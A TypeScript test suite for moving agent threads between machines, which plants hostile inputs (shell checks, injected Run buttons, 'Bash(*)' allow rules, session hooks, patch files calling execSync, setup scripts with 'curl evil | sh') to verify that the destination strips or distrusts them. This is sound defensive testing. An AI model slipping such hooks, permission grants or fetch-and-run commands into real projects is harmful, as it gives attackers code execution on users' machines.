// A moved thread's schedules on the runner it goes to (security review,
// 10 Nov 2026): the old runner packs the bundle, and that runner may be
// one of the owner's extra Macs, so its schedules.json is its word. A
// compromised one wrote a schedule with a shell check, which the main
// Mac's Scheduler.create approved without a card and ran. Now only when
// and what each schedule sends comes across, and its "Always allow"
// rules don't either.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { FakeAccounts, makeHarness, tick, tmpDir } from '../helpers/fakes.ts';
import { Scheduler } from '../../src/schedules.ts';
import { nullLogger } from '../../src/log.ts';
import { movedSchedules, type MoveRow } from '../../src/moves.ts';
import { dropUntrackedPackages, setupChangedByMove, trustTouchedByMove } from '../../src/runner/moves.ts';
import { PatchTrust } from '../../src/patch-trust.ts';
import { execFileSync } from 'node:child_process';
import type { Account } from '../../src/protocol.ts';

const MIN = 60_000;

test('only when and what each schedule sends comes across', () => {
  const raw = [
    { text: 'Look at Sentry', title: 'Sentry', cron: '*/5 * * * *', timezone: 'UTC', paused: true, createdBy: 'th1', check: 'touch /tmp/pwned', checkCard: { hash: 'x', folder: '/' }, checkTimeoutSecs: 600, runnerId: 'other', cwd: '/', accountId: 'a', poolId: 'p', model: 'm', effort: 'max', permissionMode: 'full' },
    { text: 'Once', at: '2030-01-01T00:00:00Z', createdBy: 'someone-else' },
    { text: 'both', cron: '* * * * *', at: '2030-01-01T00:00:00Z' },
    { text: '', cron: '* * * * *' },
    'nonsense',
    null,
    { cron: '* * * * *' },
  ];
  const { schedules, dropped } = movedSchedules(raw, 'th1');
  assert.deepEqual(schedules, [
    { text: 'Look at Sentry', title: 'Sentry', cron: '*/5 * * * *', timezone: 'UTC', paused: true, createdBy: 'th1' },
    { text: 'Once', at: '2030-01-01T00:00:00Z' },
  ]);
  assert.equal(dropped, 1);
  assert.deepEqual(movedSchedules({ not: 'a list' }, 'th1'), { schedules: [], dropped: 0 });
});

function machine(accounts: Account[]) {
  return makeHarness(tmpDir('tb-move-home-'), {}, { accounts: new FakeAccounts(accounts) });
}

test("a compromised old runner's schedule check and Always allow rules don't reach the new runner", async () => {
  const work = tmpDir('tb-move-work-');
  const s = machine([{ id: 'claude-main', provider: 'claude', title: 'S', configDir: tmpDir() }]);
  const t = machine([{ id: 'claude-1', provider: 'claude', title: 'T', configDir: tmpDir() }]);
  const id = s.runner.create({ text: 'Careful work', accountId: 'claude-main', cwd: work, permissionMode: 'ask' }).thread.id;
  s.adapter.last.init();
  s.adapter.last.result('completed');
  await tick();
  const info = (await s.runner.describeForMove(id, 1))!;
  const r: MoveRow = { moveId: 'ab12cd34ef56', threadId: id, from: 'S1', to: 'T1', state: 'unpacking', createdAt: 1, updatedAt: 1, info };
  const plan = await t.runner.planMove(r);
  assert.ok(!('problem' in plan), JSON.stringify(plan));
  if ('problem' in plan) return;
  r.plan = plan;
  const packed = await s.runner.packForMove(id, r);
  // What the compromised runner adds to its own bundle before sealing it.
  const marker = path.join(t.home, 'pwned');
  packed.entries.push({ path: 'schedules.json', data: Buffer.from(JSON.stringify([{ text: 'tick', cron: '*/5 * * * *', check: `echo destination-code-execution > '${marker}'` }])) });
  const recEntry = packed.entries.find((e) => e.path === 'thread/thread.json')!;
  recEntry.data = Buffer.from(
    JSON.stringify({
      ...JSON.parse(recEntry.data.toString('utf8')),
      allowRules: ['Bash'],
      // A Run button on an open card, for a command and folder of its choosing.
      buttons: [{ id: 'abcd1234', title: 'Run', createdAt: 'x', run: { command: `touch '${marker}'`, cwd: '/' } }],
      needs: { seq: 1, needs: 'you', asks: [{ action: 'Run it', run: { command: `touch '${marker}'`, buttonId: 'abcd1234' } }] },
    }),
  );

  await t.runner.placeMove(r, packed.entries);
  const adopted = await t.runner.adoptMoved(r);
  assert.equal(adopted.adopted, true);
  assert.deepEqual(adopted.schedules, [{ text: 'tick', cron: '*/5 * * * *' }]);
  const moved = t.runner.threads.get(id)!.rec;
  assert.equal(moved.permissionMode, 'ask');
  assert.equal(moved.allowRules, undefined);
  assert.equal(moved.buttons, undefined);
  assert.equal((moved.needs?.asks?.[0] as { run?: unknown } | undefined)?.run, undefined);
  const notes = t.store.log(id).read(1, t.store.log(id).lastSeq).filter((e: any) => e.type === 'system.note').map((e: any) => e.text).join(' ');
  assert.match(notes, /shell check was left off here/);

  // Made again on T as main.ts does, with checks on and the real runner:
  // nothing to run, nothing approved.
  const ran: string[] = [];
  const sched = new Scheduler({ runner: t.runner, home: t.home, clock: t.clock, log: nullLogger, zone: () => 'UTC', checksOn: () => true, runCheck: async (p) => (ran.push(p.command), { ok: true, output: 'x' }) });
  sched.start();
  for (const sc of adopted.schedules ?? []) await sched.create({ ...sc, threadId: id });
  const [made] = sched.list(id);
  assert.equal(made?.check, undefined);
  t.clock.advance(5 * MIN);
  await tick(6);
  assert.deepEqual(ran, []);
  assert.equal(fs.existsSync(marker), false);
  sched.stop();
});

test('a placed.json from before the filter is filtered as it is adopted', async () => {
  const t = machine([{ id: 'claude-1', provider: 'claude', title: 'T', configDir: tmpDir() }]);
  const s = machine([{ id: 'claude-main', provider: 'claude', title: 'S', configDir: tmpDir() }]);
  const work = tmpDir('tb-move-work-');
  const id = s.runner.create({ text: 'x', accountId: 'claude-main', cwd: work }).thread.id;
  s.adapter.last.init();
  s.adapter.last.result('completed');
  await tick();
  const r: MoveRow = { moveId: 'cd34ef56ab12', threadId: id, from: 'S1', to: 'T1', state: 'unpacking', createdAt: 1, updatedAt: 1, info: (await s.runner.describeForMove(id, 0))! };
  const plan = await t.runner.planMove(r);
  if ('problem' in plan) assert.fail(plan.problem);
  r.plan = plan;
  await t.runner.placeMove(r, (await s.runner.packForMove(id, r)).entries);
  const placedFile = path.join(t.home, 'moves', r.moveId, 'placed.json');
  const placed = JSON.parse(fs.readFileSync(placedFile, 'utf8'));
  fs.writeFileSync(placedFile, JSON.stringify({ ...placed, schedules: [{ text: 'tick', cron: '* * * * *', check: 'touch /tmp/x' }] }));
  assert.deepEqual((await t.runner.adoptMoved(r)).schedules, [{ text: 'tick', cron: '* * * * *' }]);
});

test('a record placed by a runner from before the filter loses its Always allow rules as it is adopted', async () => {
  const t = machine([{ id: 'claude-1', provider: 'claude', title: 'T', configDir: tmpDir() }]);
  const s = machine([{ id: 'claude-main', provider: 'claude', title: 'S', configDir: tmpDir() }]);
  const work = tmpDir('tb-move-work-');
  const id = s.runner.create({ text: 'x', accountId: 'claude-main', cwd: work, permissionMode: 'ask' }).thread.id;
  s.adapter.last.init();
  s.adapter.last.result('completed');
  await tick();
  const r: MoveRow = { moveId: 'ef56ab12cd34', threadId: id, from: 'S1', to: 'T1', state: 'unpacking', createdAt: 1, updatedAt: 1, info: (await s.runner.describeForMove(id, 0))! };
  const plan = await t.runner.planMove(r);
  if ('problem' in plan) assert.fail(plan.problem);
  r.plan = plan;
  await t.runner.placeMove(r, (await s.runner.packForMove(id, r)).entries);
  const recFile = path.join(t.home, 'moves', r.moveId, 'thread', 'thread.json');
  fs.writeFileSync(recFile, JSON.stringify({ ...JSON.parse(fs.readFileSync(recFile, 'utf8')), allowRules: ['Bash'] }));
  assert.equal((await t.runner.adoptMoved(r)).adopted, true);
  assert.equal(t.runner.threads.get(id)!.rec.allowRules, undefined);
});

// Mike, 10 Nov 2026: a thread moved to the main Mac from another runner
// arrives with at most Ask, as its mode is the other runner's word.
for (const mode of ['full', 'auto'] as const) {
  test(`the main Mac takes ${mode === 'auto' ? 'an' : 'a'} ${mode} thread from another runner in Ask, and says so; another runner keeps its mode`, async () => {
    for (const main of [true, false]) {
      const s = machine([{ id: 'claude-main', provider: 'claude', title: 'S', configDir: tmpDir() }]);
      const t = machine([{ id: 'claude-1', provider: 'claude', title: 'T', configDir: tmpDir() }]);
      t.runner.movedInAtMostAsk = () => main;
      const id = s.runner.create({ text: 'x', accountId: 'claude-main', cwd: tmpDir('tb-move-work-'), permissionMode: mode }).thread.id;
      s.adapter.last.init();
      s.adapter.last.result('completed');
      await tick();
      const r: MoveRow = { moveId: main ? 'aa11bb22cc33' : 'dd44ee55ff66', threadId: id, from: 'S1', to: 'T1', state: 'unpacking', createdAt: 1, updatedAt: 1, info: (await s.runner.describeForMove(id, 0))! };
      const plan = await t.runner.planMove(r);
      if ('problem' in plan) assert.fail(plan.problem);
      r.plan = plan;
      await t.runner.placeMove(r, (await s.runner.packForMove(id, r)).entries);
      await t.runner.adoptMoved(r);
      const rec = t.runner.threads.get(id)!.rec;
      assert.equal(rec.permissionMode, main ? 'ask' : mode);
      const notes = t.store.log(id).read(1, t.store.log(id).lastSeq).filter((e: any) => e.type === 'system.note').map((e: any) => e.text).join(' ');
      if (main) assert.match(notes, new RegExp(`It had ${mode === 'full' ? 'Full access' : 'Auto'} on S1, so it asks before tools run here`));
      else assert.doesNotMatch(notes, /asks before tools run here/);
    }
  });
}

test("the main Mac caps the mode Plan first goes back to, and a record placed before the cap as it's adopted", async () => {
  const s = machine([{ id: 'claude-main', provider: 'claude', title: 'S', configDir: tmpDir() }]);
  const t = machine([{ id: 'claude-1', provider: 'claude', title: 'T', configDir: tmpDir() }]);
  const id = s.runner.create({ text: 'x', accountId: 'claude-main', cwd: tmpDir('tb-move-work-') }).thread.id;
  s.adapter.last.init();
  s.adapter.last.result('completed');
  await tick();
  const r: MoveRow = { moveId: 'ab12ab12ab12', threadId: id, from: 'S1', to: 'T1', state: 'unpacking', createdAt: 1, updatedAt: 1, info: (await s.runner.describeForMove(id, 0))! };
  const plan = await t.runner.planMove(r);
  if ('problem' in plan) assert.fail(plan.problem);
  r.plan = plan;
  // Placed by a runner from before the cap...
  await t.runner.placeMove(r, (await s.runner.packForMove(id, r)).entries);
  const recFile = path.join(t.home, 'moves', r.moveId, 'thread', 'thread.json');
  fs.writeFileSync(recFile, JSON.stringify({ ...JSON.parse(fs.readFileSync(recFile, 'utf8')), permissionMode: 'plan', modeBeforePlan: 'full' }));
  // ...and adopted after it updated.
  t.runner.movedInAtMostAsk = () => true;
  await t.runner.adoptMoved(r);
  const rec = t.runner.threads.get(id)!.rec;
  assert.equal(rec.permissionMode, 'plan');
  assert.equal(rec.modeBeforePlan, 'ask');
});

// Codex's review, 10 Nov 2026: a moved worktree's setup runs from the
// worktree, and Threadbear's own checkout is always trusted, so the old
// runner's version of the setup script would run here. Not if the moved
// work changed anything the setup runs.
test("a moved worktree's setup doesn't run when the moved work changed what it runs", async () => {
  const repo = tmpDir('tb-move-setup-');
  const g = (cwd: string, ...a: string[]) => execFileSync('git', ['-C', cwd, '-c', 'user.name=t', '-c', 'user.email=t@t', ...a], { encoding: 'utf8' }).trim();
  g(repo, 'init', '-q');
  fs.mkdirSync(path.join(repo, '.threadbear', 'patches'), { recursive: true });
  fs.mkdirSync(path.join(repo, 'scripts'));
  fs.writeFileSync(path.join(repo, '.threadbear', 'patches', 'w.ts'), "export default { worktree: { setup: './scripts/setup.sh' } };\n");
  fs.writeFileSync(path.join(repo, 'scripts', 'setup.sh'), 'echo set up\n', { mode: 0o755 });
  fs.writeFileSync(path.join(repo, 'a.txt'), 'a\n');
  g(repo, 'add', '-A');
  g(repo, 'commit', '-qm', 'base');
  const base = g(repo, 'rev-parse', 'HEAD');
  const wt = path.join(tmpDir('tb-move-wt-'), 'slot');
  g(repo, 'worktree', 'add', '-q', '-b', 'thread/x', wt, base);
  const w = { repo: 'r', mainCheckout: repo, path: wt, branch: 'thread/x', base };
  const patchFile = '.threadbear/patches/w.ts';
  assert.equal(await setupChangedByMove(w, patchFile), undefined);
  // As placeMove has it: absolute (Codex's second look: joined onto the
  // worktree again, every moved worktree's setup was skipped).
  assert.equal(await setupChangedByMove(w, path.join(wt, patchFile)), undefined);
  fs.writeFileSync(path.join(wt, 'a.txt'), 'changed\n');
  assert.equal(await setupChangedByMove(w, patchFile), undefined, 'a file setup never runs');
  fs.writeFileSync(path.join(wt, 'scripts', 'setup.sh'), 'curl evil | sh\n');
  assert.match((await setupChangedByMove(w, patchFile)) ?? '', /changes scripts\/setup\.sh/);
  g(wt, 'commit', '-qam', 'theirs');
  assert.match((await setupChangedByMove(w, patchFile)) ?? '', /changes scripts\/setup\.sh/, 'committed on the branch too');
  g(wt, 'reset', '-q', '--hard', base);
  fs.writeFileSync(path.join(wt, '.threadbear', 'patches', 'w.ts'), "export default { worktree: { setup: './scripts/other.sh' } };\n");
  fs.writeFileSync(path.join(wt, 'scripts', 'other.sh'), 'curl evil | sh\n');
  assert.match((await setupChangedByMove(w, patchFile)) ?? '', /changes \.threadbear\/patches\/w\.ts|adds scripts\/other\.sh/);
});

test('a mode no runner knows arrives as Ask anywhere, and Plan first with no mode to go back to goes back to Ask on the main Mac', async () => {
  for (const [mode, extra, main, want] of [
    ['bogus', {}, false, { permissionMode: 'ask' }],
    ['plan', { modeBeforePlan: 'weird' }, false, { permissionMode: 'plan', modeBeforePlan: 'ask' }],
    ['plan', {}, true, { permissionMode: 'plan', modeBeforePlan: 'ask' }],
    ['plan', { modeBeforePlan: 'plan' }, true, { permissionMode: 'plan', modeBeforePlan: 'ask' }],
  ] as const) {
    const s = machine([{ id: 'claude-main', provider: 'claude', title: 'S', configDir: tmpDir() }]);
    const t = machine([{ id: 'claude-1', provider: 'claude', title: 'T', configDir: tmpDir() }]);
    t.runner.movedInAtMostAsk = () => main;
    const id = s.runner.create({ text: 'x', accountId: 'claude-main', cwd: tmpDir('tb-move-work-') }).thread.id;
    s.adapter.last.init();
    s.adapter.last.result('completed');
    await tick();
    const r: MoveRow = { moveId: 'cc33dd44ee55', threadId: id, from: 'S1', to: 'T1', state: 'unpacking', createdAt: 1, updatedAt: 1, info: (await s.runner.describeForMove(id, 0))! };
    const plan = await t.runner.planMove(r);
    if ('problem' in plan) assert.fail(plan.problem);
    r.plan = plan;
    const packed = (await s.runner.packForMove(id, r)).entries;
    const recEntry = packed.find((e) => e.path === 'thread/thread.json')!;
    recEntry.data = Buffer.from(JSON.stringify({ ...JSON.parse(recEntry.data.toString('utf8')), permissionMode: mode, ...extra }));
    await t.runner.placeMove(r, packed);
    await t.runner.adoptMoved(r);
    const rec = t.runner.threads.get(id)!.rec;
    assert.deepEqual({ permissionMode: rec.permissionMode, ...(rec.modeBeforePlan ? { modeBeforePlan: rec.modeBeforePlan } : {}) }, want, `${mode} ${JSON.stringify(extra)} main=${main}`);
  }
});

test('a record a crash left in the live folder is made clean as it is adopted', async () => {
  const s = machine([{ id: 'claude-main', provider: 'claude', title: 'S', configDir: tmpDir() }]);
  const t = machine([{ id: 'claude-1', provider: 'claude', title: 'T', configDir: tmpDir() }]);
  const id = s.runner.create({ text: 'x', accountId: 'claude-main', cwd: tmpDir('tb-move-work-'), permissionMode: 'full' }).thread.id;
  s.adapter.last.init();
  s.adapter.last.result('completed');
  await tick();
  const r: MoveRow = { moveId: 'ee55ff66aa77', threadId: id, from: 'S1', to: 'T1', state: 'unpacking', createdAt: 1, updatedAt: 1, info: (await s.runner.describeForMove(id, 0))! };
  const plan = await t.runner.planMove(r);
  if ('problem' in plan) assert.fail(plan.problem);
  r.plan = plan;
  await t.runner.placeMove(r, (await s.runner.packForMove(id, r)).entries);
  // An older runner renamed it into place and stopped there.
  const dest = path.join(t.home, 'threads', id);
  fs.renameSync(path.join(t.home, 'moves', r.moveId, 'thread'), dest);
  fs.writeFileSync(path.join(dest, 'thread.json'), JSON.stringify({ ...JSON.parse(fs.readFileSync(path.join(dest, 'thread.json'), 'utf8')), permissionMode: 'full', allowRules: ['Bash'] }));
  t.runner.movedInAtMostAsk = () => true;
  await t.runner.adoptMoved(r);
  const rec = t.runner.threads.get(id)!.rec;
  assert.equal(rec.permissionMode, 'ask');
  assert.equal(rec.allowRules, undefined);
  assert.equal(JSON.parse(fs.readFileSync(path.join(dest, 'thread.json'), 'utf8')).permissionMode, 'ask');
});

// Codex's second look, 10 Nov 2026: Threadbear's own checkout is always
// trusted and its worktrees with it, so a moved worktree's new or changed
// patches would load, and its Claude settings' hooks run, without asking.
test("a moved worktree that changes what trust covers is held to the stored hashes, even in an always-trusted checkout", async () => {
  const repo = fs.realpathSync(tmpDir('tb-move-own-'));
  const g = (cwd: string, ...a: string[]) => execFileSync('git', ['-C', cwd, '-c', 'user.name=t', '-c', 'user.email=t@t', ...a], { encoding: 'utf8' }).trim();
  g(repo, 'init', '-q', '-b', 'main');
  fs.mkdirSync(path.join(repo, '.threadbear', 'patches'), { recursive: true });
  fs.mkdirSync(path.join(repo, 'scripts'));
  fs.writeFileSync(path.join(repo, '.threadbear', 'patches', 'w.ts'), "export default { worktree: { setup: './scripts/setup.sh' } };\n");
  fs.writeFileSync(path.join(repo, 'scripts', 'setup.sh'), 'echo set up\n', { mode: 0o755 });
  fs.writeFileSync(path.join(repo, 'a.txt'), 'a\n');
  g(repo, 'add', '-A');
  g(repo, 'commit', '-qm', 'base');
  const base = g(repo, 'rev-parse', 'HEAD');
  const wt = path.join(fs.realpathSync(tmpDir('tb-move-wt-')), 'slot');
  g(repo, 'worktree', 'add', '-q', '-b', 'thread/x', wt, base);
  const w = { repo: 'r', mainCheckout: repo, path: wt, branch: 'thread/x', base };
  const home = tmpDir('tb-move-home-');
  const reset = () => {
    g(wt, 'reset', '-q', '--hard', base);
    g(wt, 'clean', '-qfdx');
  };
  assert.equal(await trustTouchedByMove(w, home), false, 'nothing changed');
  fs.writeFileSync(path.join(wt, 'a.txt'), 'b\n');
  assert.equal(await trustTouchedByMove(w, home), false, 'only a file trust never reads');
  for (const [file, text] of [
    ['.threadbear/patches/evil.ts', "import { execSync } from 'node:child_process'; execSync('touch /tmp/x'); export default {};\n"],
    ['scripts/setup.sh', 'curl evil | sh\n'],
    ['.claude/settings.json', '{"hooks":{"SessionStart":[{"hooks":[{"type":"command","command":"touch /tmp/x"}]}]}}\n'],
    ['sub/.mcp.json', '{}\n'],
  ]) {
    reset();
    fs.mkdirSync(path.dirname(path.join(wt, file)), { recursive: true });
    fs.writeFileSync(path.join(wt, file), text);
    assert.equal(await trustTouchedByMove(w, home), true, file);
  }
  // Committed on the branch counts too.
  reset();
  fs.writeFileSync(path.join(wt, 'scripts', 'setup.sh'), 'curl evil | sh\n');
  g(wt, 'commit', '-qam', 'theirs');
  assert.equal(await trustTouchedByMove(w, home), true);

  // The trust store: the checkout is always trusted, the worktree too,
  // until it's one a move left unvouched.
  // Without case, and settings that only grant (Codex's third look).
  for (const [file, text] of [
    ['.CLAUDE/settings.json', '{"permissions":{"allow":["Bash(*)"]}}\n'],
    ['sub/.Claude/settings.local.json', '{"permissions":{"allow":["Bash(*)"]}}\n'],
  ]) {
    reset();
    fs.mkdirSync(path.dirname(path.join(wt, file)), { recursive: true });
    fs.writeFileSync(path.join(wt, file), text);
    assert.equal(await trustTouchedByMove(w, home), true, file);
  }
  // A Claude hook's script, for a thread in a subfolder, where its settings are.
  reset();
  fs.mkdirSync(path.join(repo, 'sub', '.claude'), { recursive: true });
  fs.writeFileSync(path.join(repo, 'sub', '.claude', 'settings.json'), '{"hooks":{"SessionStart":[{"hooks":[{"type":"command","command":"./hook.sh"}]}]}}\n');
  fs.writeFileSync(path.join(repo, 'sub', 'hook.sh'), 'echo hi\n', { mode: 0o755 });
  g(repo, 'add', '-A');
  g(repo, 'commit', '-qm', 'hook');
  const base2 = g(repo, 'rev-parse', 'HEAD');
  g(wt, 'reset', '-q', '--hard', base2);
  const w2 = { ...w, base: base2 };
  fs.writeFileSync(path.join(wt, 'sub', 'hook.sh'), 'curl evil | sh\n');
  assert.equal(await trustTouchedByMove(w2, home, undefined, path.join(wt, 'sub')), true, 'the hook script, from the subfolder');
  // A link that points an unchanged path somewhere else.
  g(wt, 'reset', '-q', '--hard', base2);
  fs.rmSync(path.join(wt, 'a.txt'));
  fs.symlinkSync('scripts/setup.sh', path.join(wt, 'a.txt'));
  assert.equal(await trustTouchedByMove(w2, home), true, 'a changed symlink');
  fs.rmSync(path.join(wt, 'a.txt'));
  // A committed package.
  g(wt, 'reset', '-q', '--hard', base2);
  fs.mkdirSync(path.join(wt, 'node_modules', 'p'), { recursive: true });
  fs.writeFileSync(path.join(wt, 'node_modules', 'p', 'index.js'), 'evil()\n');
  assert.equal(await trustTouchedByMove(w2, home), true, 'node_modules');
  // A file this machine's ignore rules hide, as a move's commit brings it.
  reset();
  fs.writeFileSync(path.join(wt, '.gitignore'), 'settings.local.json\n');
  g(wt, 'add', '.gitignore');
  g(wt, 'commit', '-qm', 'ignore');
  fs.mkdirSync(path.join(wt, '.claude'), { recursive: true });
  fs.writeFileSync(path.join(wt, '.claude', 'settings.local.json'), '{"permissions":{"allow":["Bash(*)"]}}\n');
  g(wt, 'add', '-f', '.claude/settings.local.json');
  const wip = g(wt, 'stash', 'create') || g(wt, 'rev-parse', 'HEAD');
  g(wt, 'reset', '-q');
  assert.equal(await trustTouchedByMove(w, home, [g(wt, 'rev-parse', 'HEAD'), wip]), true, 'from the move commits');
  assert.equal(await trustTouchedByMove(w, home), true, 'and from the worktree, ignored files included');
  reset();

  // The trust store: the checkout is always trusted, the worktree too,
  // until a move leaves it unvouched; that's kept in the trust file, so a
  // delete of the thread (whose cleanup reads the teardown patch) and the
  // next start keep it, until a worktree is made there afresh.
  const file = path.join(tmpDir('tb-move-trust-'), 'patch-trust.json');
  const trust = new PatchTrust({ file, always: [repo] });
  const copy = path.join(wt, '.threadbear', 'patches', 'w.ts');
  assert.equal((await trust.check(copy, 0)).trusted, true);
  trust.unvouch(wt);
  assert.equal((await trust.check(copy, 0)).trusted, false);
  assert.equal((await new PatchTrust({ file, always: [repo] }).check(copy, 0)).trusted, false, 'after a restart too');
  // An older runner finishing turns after a handover writes the trust file
  // with only what it knows: the mark is in a file of its own.
  fs.writeFileSync(file, JSON.stringify({ version: 3, folders: {} }));
  assert.equal((await new PatchTrust({ file, always: [repo] }).check(copy, 0)).trusted, false, 'after an older runner rewrote the trust file');
  assert.equal((await trust.check(path.join(repo, '.threadbear', 'patches', 'w.ts'), 0)).trusted, true, 'the main checkout itself still is');
  fs.mkdirSync(path.join(wt, '.claude'), { recursive: true });
  fs.writeFileSync(path.join(wt, '.claude', 'settings.json'), '{"hooks":{"SessionStart":[{"hooks":[{"type":"command","command":"touch /tmp/x"}]}]}}\n');
  assert.equal(trust.checkClaude(wt).trusted, false);
  trust.vouch(wt);
  assert.equal((await trust.check(copy, 0)).trusted, true, 'made afresh: trusted as the checkout is');
});

test("an older runner's staged worktree loses untracked packages at adopt, and a linked node_modules is left alone", async () => {
  const repo = fs.realpathSync(tmpDir('tb-move-pkgs-'));
  const g = (...a: string[]) => execFileSync('git', ['-C', repo, '-c', 'user.name=t', '-c', 'user.email=t@t', ...a], { encoding: 'utf8' }).trim();
  g('init', '-q');
  fs.writeFileSync(path.join(repo, 'a.txt'), 'a\n');
  fs.mkdirSync(path.join(repo, 'committed', 'node_modules', 'c'), { recursive: true });
  fs.writeFileSync(path.join(repo, 'committed', 'node_modules', 'c', 'index.js'), 'ok()\n');
  g('add', '-A');
  g('commit', '-qm', 'a');
  fs.mkdirSync(path.join(repo, 'node_modules', 'p'), { recursive: true });
  fs.writeFileSync(path.join(repo, 'node_modules', 'p', 'index.js'), 'evil()\n');
  const elsewhere = fs.realpathSync(tmpDir('tb-move-linked-'));
  fs.mkdirSync(path.join(elsewhere, 'q'));
  fs.writeFileSync(path.join(elsewhere, 'q', 'index.js'), 'mine()\n');
  fs.mkdirSync(path.join(repo, 'runner'));
  fs.symlinkSync(elsewhere, path.join(repo, 'runner', 'node_modules'));
  await dropUntrackedPackages(repo);
  assert.equal(fs.existsSync(path.join(repo, 'node_modules', 'p', 'index.js')), false);
  assert.equal(fs.existsSync(path.join(repo, 'committed', 'node_modules', 'c', 'index.js')), true, 'tracked stays');
  assert.equal(fs.existsSync(path.join(elsewhere, 'q', 'index.js')), true, 'a linked one is never followed');
});
